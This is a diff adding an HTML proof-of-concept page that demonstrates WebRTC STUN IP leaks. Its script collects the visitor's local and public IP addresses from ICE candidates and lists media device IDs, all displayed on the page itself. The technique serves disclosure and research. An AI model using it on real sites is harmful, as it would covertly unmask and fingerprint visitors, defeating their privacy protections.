@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta property="og:title" content="PoC">
+    <meta property="og:url" content="рос.com/webrtc-leaks/">
+    <meta property="og:image" content="http://placehold.it/486x486">
+    <style>
+      @import(https://fonts.googleapis.com/css?family=Inconsolata);
+      html, body, ul, li, a {
+        margin: 0;
+        padding: 0;
+      }
+      ul {
+        border-top: 1px #CCCCCC solid;
+        font-family: Inconsolata, monospace;
+        font-weight: 400;
+        font-size: 12px;
+        line-height: 12px;
+        color: #333;
+      }
+      li {
+        padding: 10px 15px;
+        border-bottom: 1px #DADADA solid;
+        text-overflow: ellipsis;
+        white-space: nowrap;
+        overflow: hidden;
+      }
+      li:nth-child(odd) {
+        background-color: #F0F0F0;
+      }
+      a {
+        color: #007BE6;
+        text-decoration: none;
+      }
+      a:hover, a:focus {
+        color: #007BE6;
+        text-decoration: underline;
+      }
+    </style>
+  </head>
+  <body>
+    <ul id="msg">
+      <li>This page is a proof-of-concept for <a href="https://github.com/diafygi/webrtc-ips">IP leaks from WebRTC STUN requests</a>.</li>
+    </ul>
+    <script>
+      window.onload = function () {
+
+        var msg = document.getElementById('msg');
+        var log = function (text) {
+          var li = document.createElement('li');
+          li.textContent = text;
+          msg.appendChild(li);
+        };
+
+        (function () {
+          if (navigator && navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+            navigator.mediaDevices.enumerateDevices().then(function (ds) {
+              ds.forEach(function (d) {
+                if (d.deviceId !== 'default') {
+                  log('ID: ' + d.kind + '/' + d.deviceId);
+                }
+              });
+              log('ID: Done!');
+            });
+          }
+          else {
+            log('ID: Not Supported');
+          }
+        })();
+
+        (function () {
+          var RTC = window.RTCPeerConnection ||
+                    window.mozRTCPeerConnection ||
+                    window.webkitRTCPeerConnection ||
+                    window.msRTCPeerConnection;
+          if (RTC) {
+            var bucket = {};
+            var nop = function () {};
+            var servers = { iceServers: [{ urls: 'stun:stun.l.google.com:19302?transport=udp' }]};
+            var pc = new RTC(servers, { optional: [{ RtpDataChannels: true }]});
+            pc.onicecandidate = function (ice) {
+              if (ice.candidate) {
+                var line = ice.candidate.candidate;
+                var regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/
+                var ip = regex.exec(line)[1];
+                if (bucket[ip] === undefined) log('IP: ' + ip);
+                bucket[ip] = true;
+              }
+              else {
+                log('IP: Done!');
+              }
+            };
+            pc.createDataChannel('');
+            pc.createOffer(function (r) { pc.setLocalDescription(r, nop, nop); }, nop);
+          }
+          else {
+            log('IP: Not Supported');
+          }
+        })();
+      }
+    </script>
+  </body>
+</html>
